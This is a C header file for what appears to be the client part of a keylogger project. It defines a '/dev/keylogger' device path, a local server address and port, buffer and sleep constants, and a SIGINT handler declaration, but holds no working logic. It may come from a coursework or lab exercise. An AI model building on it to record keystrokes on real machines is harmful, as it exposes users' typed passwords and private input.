#ifndef CLIENT_H
#define CLIENT_H
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <signal.h>

#define DEVICE_PATH "/dev/keylogger"
#define BUFFER_SIZE 128
#define SERVER_PORT 8080
#define SERVER_IP "127.0.0.1"
#define CLIENT_SLEEP_TIME 1 // in milliseconds

volatile sig_atomic_t exit_case;

void handle_sigint(int sig);

#endif //CLIENT_H
